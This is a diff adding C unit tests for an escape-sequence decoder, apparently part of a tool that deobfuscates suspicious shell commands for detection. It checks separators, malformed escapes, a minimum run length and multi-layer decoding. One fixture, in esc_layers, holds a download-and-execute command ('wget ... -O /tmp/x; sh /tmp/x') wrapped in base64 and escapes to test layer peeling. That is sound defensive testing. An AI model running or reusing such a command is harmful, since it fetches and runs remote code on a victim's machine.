@@ -294,6 +294,138 @@ static void hex_known_answers(void)
 	NCK(!memcmp(tmp, want, n));
 }
 
+/* ---- escapes: `\xNN` and `/xNN` -------------------------------------------------------------- */
+
+static size_t esc_text(char *enc, char sep, unsigned count, int mode)
+{
+	uint8_t plain[64];
+	unsigned i;
+
+	for (i = 0; i < count; i++)
+		plain[i] = (uint8_t)PAYLOAD[i];
+	return nr_esc_enc(plain, count, enc, sep, mode);
+}
+
+/* each separator, each digit case, mixed within a run, and a different thing either side */
+static void esc_known_answers(void)
+{
+	uint8_t plain[40];
+	char enc[200];
+	unsigned sep, mode;
+	size_t k, n, el;
+
+	for (k = 0; k < sizeof plain; k++)
+		plain[k] = (uint8_t)PAYLOAD[k];
+	for (sep = 0; sep < 2; sep++)
+		for (mode = 0; mode < 3; mode++) {
+			el = nr_esc_enc(plain, sizeof plain, enc, sep ? '/' : '\\', (int)mode);
+			n = build(mode == 1 ? "\"" : " ", enc, el, mode == 2 ? "\"\n" : "\n", plain,
+				  sizeof plain);
+			memcpy(tmp, buf, n);
+			NCKF(kof_exe_unesc(tmp, n) == 1, "esc sep %u mode %u", sep, mode);
+			NCKF(!memcmp(tmp, want, n), "esc sep %u mode %u: bytes", sep, mode);
+		}
+	/* binary comes out too: the syntax is the evidence, not the text - every byte value */
+	{
+		uint8_t all[256];
+		char big[1100];
+
+		for (k = 0; k < 256; k++)
+			all[k] = (uint8_t)k;
+		el = nr_esc_enc(all, 256, big, '\\', 0);
+		n = build(" ", big, el, "\n", all, 256);
+		memcpy(tmp, buf, n);
+		NCK(kof_exe_unesc(tmp, n) == 1 && !memcmp(tmp, want, n));
+	}
+}
+
+/* what ends or refuses a run: one separator, whole escapes, a lower case x, an escaped backslash */
+static void esc_refused(void)
+{
+	char enc[300];
+	size_t el, n, k;
+
+	/* a second separator in the middle: two runs, neither at the floor */
+	el = esc_text(enc, '\\', 12, 0);
+	enc[4u * 6u] = '/';
+	n = build(" ", enc, el, "\n", NULL, 0);
+	memcpy(tmp, buf, n);
+	NCK(kof_exe_unesc(tmp, n) == 0 && !memcmp(tmp, buf, n));
+	/* a digit that is not one, in the middle of twelve */
+	el = esc_text(enc, '\\', 12, 0);
+	enc[4u * 6u + 2u] = 'Z';
+	n = build(" ", enc, el, "\n", NULL, 0);
+	memcpy(tmp, buf, n);
+	NCK(kof_exe_unesc(tmp, n) == 0 && !memcmp(tmp, buf, n));
+	/* a capital X is not C's escape */
+	for (k = 0; k < 12; k++)
+		put(buf, 4u * k, "\\X41");
+	memcpy(tmp, buf, 48);
+	NCK(kof_exe_unesc(tmp, 48) == 0 && !memcmp(tmp, buf, 48));
+	/* a cut escape at the end leaves the whole ones before it as a run of eight */
+	el = esc_text(enc, '\\', 8, 0);
+	n = build(" ", enc, el, "\\x4", NULL, 0);
+	memcpy(tmp, buf, n);
+	NCK(kof_exe_unesc(tmp, n) == 1 && !memcmp(tmp + n - 3u, "\\x4", 3u));
+	/* doubled backslashes are text: `\\x41` is a backslash and x41 */
+	for (k = 0; k < 12; k++)
+		put(buf, 5u * k, "\\\\x41");
+	memcpy(tmp, buf, 60);
+	NCK(kof_exe_unesc(tmp, 60) == 0 && !memcmp(tmp, buf, 60));
+	/* an escaped backslash in front of a run of eight takes the first escape out of it */
+	el = esc_text(enc, '\\', 8, 0);
+	n = put(buf, 0, "\\") ;
+	memcpy(buf + n, enc, el);
+	memcpy(tmp, buf, n + el);
+	NCK(kof_exe_unesc(tmp, n + el) == 0 && !memcmp(tmp, buf, n + el));
+	/* and in front of a run of nine it leaves eight, which is read */
+	el = esc_text(enc, '\\', 9, 0);
+	n = put(buf, 0, "\\");
+	memcpy(buf + n, enc, el);
+	memcpy(tmp, buf, n + el);
+	NCK(kof_exe_unesc(tmp, n + el) == 1 && tmp[0] == '\\');
+	/* three backslashes before an escape: the last one starts it */
+	el = esc_text(enc, '\\', 8, 0);
+	n = put(buf, 0, "\\\\");
+	memcpy(buf + n, enc, el);
+	memcpy(tmp, buf, n + el);
+	NCK(kof_exe_unesc(tmp, n + el) == 1 && !memcmp(tmp, "\\\\", 2u));
+}
+
+/* seven is a path or a locale table, eight is a run: one below and one at the floor, both separators */
+static void esc_floor(void)
+{
+	char enc[200];
+	unsigned sep, count;
+	size_t el, n;
+
+	for (sep = 0; sep < 2; sep++)
+		for (count = 6; count <= 9; count++) {
+			el = esc_text(enc, sep ? '/' : '\\', count, 0);
+			n = build(" ", enc, el, "\n", NULL, 0);
+			memcpy(tmp, buf, n);
+			NCKF(kof_exe_unesc(tmp, n) == (count >= 8u), "esc floor sep %u count %u", sep,
+			     count);
+		}
+}
+
+/* an escaped base64 command is two layers, and the driver peels both */
+static void esc_layers(void)
+{
+	char b64[200], enc[900], cmd[] = "wget http://10.0.0.1/x -O /tmp/x; sh /tmp/x";
+	char text[300];
+	size_t bl, tl, el, n;
+	struct kof_exe_decode_res res;
+
+	bl = nr_b64_enc((const uint8_t *)cmd, strlen(cmd), b64, 1, 0, 0);
+	tl = (size_t)snprintf(text, sizeof text, "echo %.*s | base64 -d\n", (int)bl, b64);
+	el = nr_esc_enc((const uint8_t *)text, tl, enc, '\\', 0);
+	n = build(" ", enc, el, "\n", NULL, 0);
+	memcpy(tmp, buf, n);
+	NCK(kof_exe_decode_ex(tmp, n, &res) == 1 && res.rounds >= 2u);
+	NCK(memmem(tmp, n, cmd, strlen(cmd)) != NULL);
+}
+
 /* every byte value in front of the run: decoded only for the delimiters. */
 static void hex_delimiters(void)
 {
@@ -851,6 +983,11 @@ static void differential_single_passes(void)
 		pa = kof_exe_unhex(a, n);
 		pb = nr_unhex(b, n, 0, n, NULL);
 		NCKF(pa == pb && !memcmp(a, b, n), "unhex seed %u", seed);
+		memcpy(a, buf, n);
+		memcpy(b, buf, n);
+		pa = kof_exe_unesc(a, n);
+		pb = nr_unesc(b, n, 0, n, NULL);
+		NCKF(pa == pb && !memcmp(a, b, n), "unesc seed %u", seed);
 	}
 }
 
@@ -870,6 +1007,10 @@ int main(void)
 	pct_known_answers();
 	pct_body_set();
 	pct_delimiters();
+	esc_known_answers();
+	esc_refused();
+	esc_floor();
+	esc_layers();
 	layers_to_the_bottom();
 	single_pass_peels_one_layer();
 	decode_fixed_point_and_identity();
